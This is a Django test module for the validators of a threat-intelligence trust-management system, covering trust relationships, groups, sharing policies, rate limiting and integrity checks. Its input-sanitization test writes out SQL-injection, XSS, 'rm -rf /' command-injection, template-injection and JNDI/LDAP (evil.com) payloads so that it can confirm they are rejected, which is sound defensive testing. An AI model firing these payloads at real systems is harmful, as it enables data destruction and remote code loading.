"""
Core Validator Tests for Trust Management

This module tests the validator functions directly to achieve high coverage
while avoiding circular import issues.
"""

import uuid
import time
from unittest.mock import patch, MagicMock
from django.test import TestCase, override_settings
from django.core.cache import cache
from django.utils import timezone
from datetime import timedelta

# Import models that validators use
from ..models import TrustLevel, TrustGroup, TrustRelationship, SharingPolicy


class ValidatorCoreTest(TestCase):
    """Test core validator functionality by testing functions directly."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.trust_level = TrustLevel.objects.create(
            name='Validator Test Trust Level',
            level='medium',
            description='Test trust level for validators',
            numerical_value=50,
            default_anonymization_level='partial',
            default_access_level='read',
            created_by='test_user',
            is_system_default=True
        )
        
        self.high_trust_level = TrustLevel.objects.create(
            name='High Validator Trust Level',
            level='high',
            description='High test trust level for validators',
            numerical_value=80,
            default_anonymization_level='minimal',
            default_access_level='contribute',
            created_by='test_user'
        )
        
        self.org_1 = str(uuid.uuid4())
        self.org_2 = str(uuid.uuid4())
        self.user_1 = 'validator_test_user'
        cache.clear()
    
    def test_validate_trust_operation_main_function(self):
        """Test the main validate_trust_operation function."""
        # Import directly from validators module
        from ..validators import validate_trust_operation
        
        # Test create_relationship
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Validator Test Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(len(result['errors']), 0)
    
    def test_trust_relationship_validator_class(self):
        """Test TrustRelationshipValidator class methods."""
        from TrustManagement.validators import TrustRelationshipValidator
        
        # Test validate_create_relationship
        result = TrustRelationshipValidator.validate_create_relationship(
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Validator Test Trust Level',
            relationship_type='bilateral'
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['trust_level'], self.trust_level)
        
        # Test invalid UUID
        result = TrustRelationshipValidator.validate_create_relationship(
            source_org='invalid-uuid',
            target_org=self.org_2,
            trust_level_name='Validator Test Trust Level',
            relationship_type='bilateral'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid source organization UUID' in error for error in result['errors']))
        
        # Test same organizations
        result = TrustRelationshipValidator.validate_create_relationship(
            source_org=self.org_1,
            target_org=self.org_1,
            trust_level_name='Validator Test Trust Level',
            relationship_type='bilateral'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('cannot be the same' in error for error in result['errors']))
        
        # Test invalid trust level
        result = TrustRelationshipValidator.validate_create_relationship(
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Non-existent Trust Level',
            relationship_type='bilateral'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not found or inactive' in error for error in result['errors']))
        
        # Test invalid relationship type
        result = TrustRelationshipValidator.validate_create_relationship(
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Validator Test Trust Level',
            relationship_type='invalid_type'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid relationship type' in error for error in result['errors']))
    
    def test_trust_relationship_validator_approval(self):
        """Test approval validation."""
        from TrustManagement.validators import TrustRelationshipValidator
        
        # Create a relationship first
        relationship = TrustRelationship.objects.create(
            source_organization=self.org_1,
            target_organization=self.org_2,
            trust_level=self.trust_level,
            relationship_type='bilateral',
            anonymization_level='partial',
            status='pending',
            created_by=self.user_1,
            last_modified_by=self.user_1
        )
        
        # Test valid approval
        result = TrustRelationshipValidator.validate_approval_request(
            relationship_id=str(relationship.id),
            approving_org=self.org_1,
            approved_by_user=self.user_1
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['relationship'], relationship)
        
        # Test invalid organization
        invalid_org = str(uuid.uuid4())
        result = TrustRelationshipValidator.validate_approval_request(
            relationship_id=str(relationship.id),
            approving_org=invalid_org,
            approved_by_user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not part of this trust relationship' in error for error in result['errors']))
        
        # Test non-existent relationship
        result = TrustRelationshipValidator.validate_approval_request(
            relationship_id=str(uuid.uuid4()),
            approving_org=self.org_1,
            approved_by_user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not found or inactive' in error for error in result['errors']))
    
    def test_trust_relationship_validator_revocation(self):
        """Test revocation validation."""
        from TrustManagement.validators import TrustRelationshipValidator
        
        # Create a relationship
        relationship = TrustRelationship.objects.create(
            source_organization=self.org_1,
            target_organization=self.org_2,
            trust_level=self.trust_level,
            relationship_type='bilateral',
            anonymization_level='partial',
            status='active',
            created_by=self.user_1,
            last_modified_by=self.user_1
        )
        
        # Test valid revocation
        result = TrustRelationshipValidator.validate_revocation_request(
            relationship_id=str(relationship.id),
            revoking_org=self.org_1,
            revoked_by_user=self.user_1,
            reason='Test revocation'
        )
        
        self.assertTrue(result['valid'])
        self.assertTrue(any('will immediately stop' in warning for warning in result['warnings']))
        
        # Test without reason
        result = TrustRelationshipValidator.validate_revocation_request(
            relationship_id=str(relationship.id),
            revoking_org=self.org_1,
            revoked_by_user=self.user_1
        )
        
        self.assertTrue(result['valid'])
        self.assertTrue(any('No reason provided' in warning for warning in result['warnings']))
    
    def test_trust_group_validator_class(self):
        """Test TrustGroupValidator class methods."""
        from TrustManagement.validators import TrustGroupValidator
        
        # Test valid group creation
        result = TrustGroupValidator.validate_create_group(
            name='Test Validator Group',
            description='A test group for validators',
            creator_org=self.org_1,
            group_type='community',
            default_trust_level_name='Validator Test Trust Level'
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['trust_level'], self.trust_level)
        
        # Test invalid name
        result = TrustGroupValidator.validate_create_group(
            name='',
            description='A test group',
            creator_org=self.org_1,
            group_type='community'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('name is required' in error for error in result['errors']))
        
        # Test long name
        long_name = 'x' * 300
        result = TrustGroupValidator.validate_create_group(
            name=long_name,
            description='A test group',
            creator_org=self.org_1,
            group_type='community'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('too long' in error for error in result['errors']))
        
        # Test special characters warning
        result = TrustGroupValidator.validate_create_group(
            name='Test@Group#$%',
            description='A test group',
            creator_org=self.org_1,
            group_type='community'
        )
        
        self.assertTrue(result['valid'])
        self.assertTrue(any('special characters' in warning for warning in result['warnings']))
        
        # Test invalid group type
        result = TrustGroupValidator.validate_create_group(
            name='Valid Group Name',
            description='A test group',
            creator_org=self.org_1,
            group_type='invalid_type'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid group type' in error for error in result['errors']))
    
    def test_trust_group_validator_join_group(self):
        """Test group join validation."""
        from TrustManagement.validators import TrustGroupValidator
        
        # Create a group
        group = TrustGroup.objects.create(
            name='Join Test Group',
            description='A group for join testing',
            created_by=self.org_1
        )
        
        # Test valid join
        result = TrustGroupValidator.validate_join_group(
            group_id=str(group.id),
            organization=self.org_2,
            membership_type='member'
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['group'], group)
        
        # Test invalid organization UUID
        result = TrustGroupValidator.validate_join_group(
            group_id=str(group.id),
            organization='invalid-uuid',
            membership_type='member'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid organization UUID' in error for error in result['errors']))
        
        # Test non-existent group
        result = TrustGroupValidator.validate_join_group(
            group_id=str(uuid.uuid4()),
            organization=self.org_2,
            membership_type='member'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not found or inactive' in error for error in result['errors']))
        
        # Test invalid membership type
        result = TrustGroupValidator.validate_join_group(
            group_id=str(group.id),
            organization=self.org_2,
            membership_type='invalid_type'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid membership type' in error for error in result['errors']))
    
    def test_access_control_validator_class(self):
        """Test AccessControlValidator class methods."""
        from TrustManagement.validators import AccessControlValidator
        
        # Test valid intelligence access
        result = AccessControlValidator.validate_intelligence_access(
            requesting_org=self.org_1,
            intelligence_owner=self.org_2,
            resource_type='indicator',
            required_access_level='read'
        )
        
        self.assertTrue(result['valid'])
        
        # Test invalid UUID
        result = AccessControlValidator.validate_intelligence_access(
            requesting_org='invalid-uuid',
            intelligence_owner=self.org_2,
            resource_type='indicator',
            required_access_level='read'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid requesting organization UUID' in error for error in result['errors']))
        
        # Test invalid access level
        result = AccessControlValidator.validate_intelligence_access(
            requesting_org=self.org_1,
            intelligence_owner=self.org_2,
            resource_type='indicator',
            required_access_level='invalid_level'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid access level' in error for error in result['errors']))
        
        # Test unusual resource type warning
        result = AccessControlValidator.validate_intelligence_access(
            requesting_org=self.org_1,
            intelligence_owner=self.org_2,
            resource_type='unusual-type',
            required_access_level='read'
        )
        
        self.assertTrue(result['valid'])
        self.assertTrue(any('Unusual resource type' in warning for warning in result['warnings']))
    
    def test_access_control_validator_sharing_policy(self):
        """Test sharing policy validation."""
        from TrustManagement.validators import AccessControlValidator
        
        # Test valid policy
        policy_data = {
            'name': 'Test Validator Policy',
            'description': 'A test policy for validators',
            'allowed_stix_types': ['indicator', 'malware'],
            'max_tlp_level': 'green',
            'max_age_days': 30
        }
        
        result = AccessControlValidator.validate_sharing_policy(policy_data)
        self.assertTrue(result['valid'])
        
        # Test missing required fields
        incomplete_policy = {
            'description': 'Missing name'
        }
        
        result = AccessControlValidator.validate_sharing_policy(incomplete_policy)
        self.assertFalse(result['valid'])
        self.assertTrue(any('name\' is required' in error for error in result['errors']))
        
        # Test conflicting STIX types
        conflicting_policy = {
            'name': 'Conflicting Policy',
            'description': 'Policy with conflicts',
            'allowed_stix_types': ['indicator', 'malware'],
            'blocked_stix_types': ['indicator', 'attack-pattern']
        }
        
        result = AccessControlValidator.validate_sharing_policy(conflicting_policy)
        self.assertFalse(result['valid'])
        self.assertTrue(any('cannot be both allowed and blocked' in error for error in result['errors']))
        
        # Test invalid TLP level
        invalid_tlp_policy = {
            'name': 'Invalid TLP Policy',
            'description': 'Policy with invalid TLP',
            'max_tlp_level': 'invalid'
        }
        
        result = AccessControlValidator.validate_sharing_policy(invalid_tlp_policy)
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid TLP level' in error for error in result['errors']))
        
        # Test invalid age constraint
        invalid_age_policy = {
            'name': 'Invalid Age Policy',
            'description': 'Policy with invalid age',
            'max_age_days': -5
        }
        
        result = AccessControlValidator.validate_sharing_policy(invalid_age_policy)
        self.assertFalse(result['valid'])
        self.assertTrue(any('non-negative integer' in error for error in result['errors']))
        
        # Test very long retention warning
        long_retention_policy = {
            'name': 'Long Retention Policy',
            'description': 'Policy with long retention',
            'max_age_days': 5000
        }
        
        result = AccessControlValidator.validate_sharing_policy(long_retention_policy)
        self.assertTrue(result['valid'])
        self.assertTrue(any('Very long retention' in warning for warning in result['warnings']))
    
    def test_security_validator_class(self):
        """Test SecurityValidator class methods."""
        from TrustManagement.validators import SecurityValidator
        
        # Test bulk operations validation
        result = SecurityValidator.validate_bulk_operations(50, self.user_1)
        self.assertTrue(result['valid'])
        
        # Test too many operations
        result = SecurityValidator.validate_bulk_operations(150, self.user_1)
        self.assertFalse(result['valid'])
        self.assertTrue(any('limited to 100 items' in error for error in result['errors']))
        
        # Test warning threshold
        result = SecurityValidator.validate_bulk_operations(75, self.user_1)
        self.assertTrue(result['valid'])
        self.assertTrue(any('Large bulk operation' in warning for warning in result['warnings']))
        
        # Test no user specified
        result = SecurityValidator.validate_bulk_operations(10, '')
        self.assertTrue(result['valid'])
        self.assertTrue(any('No user specified' in warning for warning in result['warnings']))
    
    def test_security_validator_trust_escalation(self):
        """Test trust escalation validation."""
        from TrustManagement.validators import SecurityValidator
        
        # Test minor escalation (30 point increase requires substantial justification)
        result = SecurityValidator.validate_trust_escalation(
            current_trust_level=self.trust_level,
            new_trust_level=self.high_trust_level,
            justification='Increased cooperation and demonstrated reliability over multiple successful intelligence sharing events that have proven their trustworthiness and operational security measures.'
        )
        
        self.assertTrue(result['valid'])
        # Trust increase from 50 to 80 should be 30
        expected_increase = self.high_trust_level.numerical_value - self.trust_level.numerical_value
        self.assertEqual(result['trust_increase'], expected_increase)
        
        # Test major escalation without justification
        low_trust = TrustLevel.objects.create(
            name='Low Security Trust',
            level='low',
            description='Low trust for security testing',
            numerical_value=20,
            default_anonymization_level='full',
            default_access_level='read',
            created_by='test_user'
        )
        
        result = SecurityValidator.validate_trust_escalation(
            current_trust_level=low_trust,
            new_trust_level=self.high_trust_level
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('requires detailed justification' in error for error in result['errors']))
        
        # Test major escalation with adequate justification
        result = SecurityValidator.validate_trust_escalation(
            current_trust_level=low_trust,
            new_trust_level=self.high_trust_level,
            justification='This is a detailed justification for the trust level increase based on comprehensive security review and improved operational security measures.'
        )
        
        self.assertTrue(result['valid'])
        
        # Test suspicious justification
        result = SecurityValidator.validate_trust_escalation(
            current_trust_level=low_trust,
            new_trust_level=self.high_trust_level,
            justification='hack the system for testing'
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('suspicious justification' in error for error in result['errors']))
    
    def test_security_validator_input_sanitization(self):
        """Test input sanitization."""
        from TrustManagement.validators import SecurityValidator
        
        # Test clean input
        clean_data = {'name': 'Test', 'description': 'Clean description'}
        result = SecurityValidator.validate_input_sanitization(clean_data)
        self.assertTrue(result['valid'])
        
        # Test SQL injection
        sql_injection_data = {'name': "'; DROP TABLE users; --"}
        result = SecurityValidator.validate_input_sanitization(sql_injection_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('SQL injection' in error for error in result['errors']))
        
        # Test XSS
        xss_data = {'name': '<script>alert("xss")</script>'}
        result = SecurityValidator.validate_input_sanitization(xss_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('XSS' in error for error in result['errors']))
        
        # Test command injection
        cmd_injection_data = {'name': 'test; rm -rf /'}
        result = SecurityValidator.validate_input_sanitization(cmd_injection_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('Command injection' in error for error in result['errors']))
        
        # Test template injection
        template_injection_data = {'name': '{{7*7}}'}
        result = SecurityValidator.validate_input_sanitization(template_injection_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('Template injection' in error for error in result['errors']))
        
        # Test LDAP injection
        ldap_injection_data = {'name': 'jndi:ldap://evil.com/exploit'}
        result = SecurityValidator.validate_input_sanitization(ldap_injection_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('LDAP injection' in error for error in result['errors']))
        
        # Test null bytes
        null_byte_data = {'name': 'test\x00malicious'}
        result = SecurityValidator.validate_input_sanitization(null_byte_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('Null byte detected' in error for error in result['errors']))
        
        # Test very long input
        long_input_data = {'name': 'x' * 15000}
        result = SecurityValidator.validate_input_sanitization(long_input_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('exceeds maximum length' in error for error in result['errors']))
        
        # Test long input warning (should be valid but with warning)
        warning_input_data = {'name': 'x' * 7000}
        result = SecurityValidator.validate_input_sanitization(warning_input_data)
        self.assertTrue(result['valid'])  # Should be valid but with warning
        self.assertTrue(any('Long input detected' in warning for warning in result['warnings']))
    
    def test_security_validator_temporal_security(self):
        """Test temporal security validation."""
        from TrustManagement.validators import SecurityValidator
        
        # Test valid timestamp
        current_time = time.time()
        result = SecurityValidator.validate_temporal_security(current_time)
        self.assertTrue(result['valid'])
        
        # Test old timestamp
        old_time = time.time() - 600  # 10 minutes ago
        result = SecurityValidator.validate_temporal_security(old_time, max_age_minutes=5)
        self.assertFalse(result['valid'])
        self.assertTrue(any('too old' in error for error in result['errors']))
        
        # Test future timestamp
        future_time = time.time() + 120  # 2 minutes in future
        result = SecurityValidator.validate_temporal_security(future_time)
        self.assertFalse(result['valid'])
        self.assertTrue(any('in the future' in error for error in result['errors']))
        
        # Test approaching age limit
        approaching_old_time = time.time() - 240  # 4 minutes ago (80% of 5 minute limit)
        result = SecurityValidator.validate_temporal_security(approaching_old_time, max_age_minutes=5)
        self.assertTrue(result['valid'])
        self.assertTrue(any('approaching age limit' in warning for warning in result['warnings']))
        
        # Test slight future timestamp
        slight_future_time = time.time() + 45  # 45 seconds in future
        result = SecurityValidator.validate_temporal_security(slight_future_time)
        self.assertTrue(result['valid'])
        self.assertTrue(any('slightly in the future' in warning for warning in result['warnings']))
    
    @override_settings(TRUST_MANAGEMENT_SECRET_KEY='test-secret-key')
    def test_security_validator_cryptographic_integrity(self):
        """Test cryptographic integrity validation."""
        from TrustManagement.validators import SecurityValidator
        import hmac
        import hashlib
        
        data = {'test': 'data', 'value': 123}
        key = 'test-secret-key'
        message = str(sorted(data.items())).encode('utf-8')
        signature = hmac.new(key.encode('utf-8'), message, hashlib.sha256).hexdigest()
        
        # Test valid signature
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            signature=signature,
            key=key
        )
        self.assertTrue(result['valid'])
        
        # Test invalid signature
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            signature='invalid_signature',
            key=key
        )
        self.assertFalse(result['valid'])
        self.assertTrue(any('signature verification failed' in error for error in result['errors']))
        
        # Test hash validation
        data_str = str(sorted(data.items()))
        expected_hash = hashlib.sha256(data_str.encode()).hexdigest()
        
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            expected_hash=expected_hash
        )
        self.assertTrue(result['valid'])
        
        # Test invalid hash
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            expected_hash='invalid_hash'
        )
        self.assertFalse(result['valid'])
        self.assertTrue(any('hash mismatch' in error for error in result['errors']))
    
    def test_security_validator_rate_limiting(self):
        """Test rate limiting validation."""
        from TrustManagement.validators import SecurityValidator
        
        # Test normal rate limiting
        result = SecurityValidator.validate_rate_limiting(
            operation_type='test_op',
            user=self.user_1,
            organization=self.org_1
        )
        self.assertTrue(result['valid'])
        
        # Test with mock high count
        with patch('django.core.cache.cache.get', return_value=15):
            result = SecurityValidator.validate_rate_limiting(
                operation_type='test_op',
                user=self.user_1,
                organization=self.org_1
            )
            self.assertFalse(result['valid'])
            self.assertTrue(any('Rate limit exceeded' in error for error in result['errors']))
        
        # Test warning threshold
        with patch('django.core.cache.cache.get', return_value=8):
            result = SecurityValidator.validate_rate_limiting(
                operation_type='test_op',
                user=self.user_1,
                organization=self.org_1
            )
            self.assertTrue(result['valid'])
            self.assertTrue(any('Approaching rate limit' in warning for warning in result['warnings']))
        
        # Test organization rate limiting
        with patch('django.core.cache.cache.get') as mock_get:
            # Return different values for user vs org cache keys
            def side_effect(key, default=None):
                if 'rate_limit_org:' in key:
                    return 60  # Above org limit (50)
                return 5  # Below user limit
            mock_get.side_effect = side_effect
            
            result = SecurityValidator.validate_rate_limiting(
                operation_type='test_op',
                user=self.user_1,
                organization=self.org_1
            )
            self.assertFalse(result['valid'])
            self.assertTrue(any('Organization rate limit exceeded' in error for error in result['errors']))
    
    def test_security_validator_record_operation(self):
        """Test operation recording."""
        from TrustManagement.validators import SecurityValidator
        
        # This should not raise exceptions
        SecurityValidator.record_operation('test_op', self.user_1, self.org_1)
        SecurityValidator.record_operation('test_op', self.user_1)  # Without org
    
    def test_security_validator_suspicious_patterns(self):
        """Test suspicious pattern detection."""
        from TrustManagement.validators import SecurityValidator
        
        # Test normal operation
        result = SecurityValidator.validate_suspicious_patterns(self.user_1, self.org_1)
        self.assertTrue(result['valid'])
        
        # Test with high frequency mock
        with patch('django.core.cache.cache.get', return_value=15):
            result = SecurityValidator.validate_suspicious_patterns(self.user_1, self.org_1)
            self.assertTrue(result['valid'])  # Should still be valid but with warnings
            self.assertTrue(any('high operation frequency' in warning for warning in result['warnings']))
        
        # Test with mutual trust detection
        operation_data = {
            'source_organization': self.org_1,
            'target_organization': self.org_2
        }
        
        # Create reverse relationship to trigger mutual trust warning
        TrustRelationship.objects.create(
            source_organization=self.org_2,
            target_organization=self.org_1,
            trust_level=self.trust_level,
            relationship_type='bilateral',
            anonymization_level='partial',
            created_by=self.user_1,
            last_modified_by=self.user_1
        )
        
        result = SecurityValidator.validate_suspicious_patterns(
            self.user_1, self.org_1, operation_data
        )
        self.assertTrue(result['valid'])
        self.assertTrue(any('mutual trust relationship' in warning for warning in result['warnings']))
        
        # Test high trust level detection
        high_trust_data = {
            'trust_level_name': 'High Trust Level'
        }
        
        result = SecurityValidator.validate_suspicious_patterns(
            self.user_1, self.org_1, high_trust_data
        )
        self.assertTrue(result['valid'])
        self.assertTrue(any('High trust level selected' in warning for warning in result['warnings']))


class ValidatorErrorHandlingTest(TestCase):
    """Test validator error handling and edge cases."""
    
    def setUp(self):
        """Set up test fixtures."""
        cache.clear()
    
    def test_validate_trust_operation_unknown_operation(self):
        """Test handling of unknown operation types."""
        from ..validators import validate_trust_operation
        
        result = validate_trust_operation('unknown_operation', user='test')
        self.assertFalse(result['valid'])
        self.assertTrue(any('Unknown operation type' in error for error in result['errors']))
    
    def test_validate_trust_operation_exception_handling(self):
        """Test exception handling in main validation function."""
        from ..validators import validate_trust_operation
        
        # Test with mock exception
        with patch('TrustManagement.validators.TrustRelationshipValidator.validate_create_relationship', 
                  side_effect=Exception('Test exception')):
            result = validate_trust_operation(
                'create_relationship',
                source_org='test_org',
                user='test_user'
            )
            
            self.assertFalse(result['valid'])
            self.assertTrue(any('Validation error' in error for error in result['errors']))
    
    def test_validator_with_cache_errors(self):
        """Test validator behavior when cache operations fail."""
        from TrustManagement.validators import SecurityValidator
        
        # Mock cache operations to raise exceptions
        with patch('django.core.cache.cache.get', side_effect=Exception('Cache error')):
            result = SecurityValidator.validate_rate_limiting(
                'test_op', 'test_user', 'test_org'
            )
            # Should still be valid (fail-open for cache errors)
            self.assertTrue(result['valid'])
            self.assertTrue(any('Rate limiting check failed' in warning for warning in result['warnings']))
    
    def test_temporal_security_with_invalid_timestamp(self):
        """Test temporal security with invalid timestamp."""
        from TrustManagement.validators import SecurityValidator
        
        # Test with invalid timestamp
        result = SecurityValidator.validate_temporal_security('invalid_timestamp')
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid timestamp format' in error for error in result['errors']))
    
    def test_anonymization_downgrade_validation(self):
        """Test anonymization downgrade validation."""
        from TrustManagement.validators import SecurityValidator
        
        trust_level = TrustLevel.objects.create(
            name='Anonymization Test Trust',
            level='medium',
            description='Test trust level',
            numerical_value=50,
            default_anonymization_level='partial',
            default_access_level='read',
            created_by='test_user'
        )
        
        # Test normal downgrade
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'partial', trust_level
        )
        self.assertTrue(result['valid'])
        
        # Test significant downgrade
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'none', trust_level
        )
        self.assertFalse(result['valid'])  # Should fail due to insufficient trust level
        self.assertTrue(any('requires high trust level' in error for error in result['errors']))
        
        # Test with high trust level
        high_trust = TrustLevel.objects.create(
            name='High Anonymization Trust',
            level='high',
            description='High trust level',
            numerical_value=80,
            default_anonymization_level='minimal',
            default_access_level='contribute',
            created_by='test_user'
        )
        
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'none', high_trust
        )
        self.assertTrue(result['valid'])
        
        # Test major downgrade warning
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'minimal', high_trust
        )
        self.assertTrue(result['valid'])
        self.assertTrue(any('Significant anonymization reduction' in warning for warning in result['warnings']))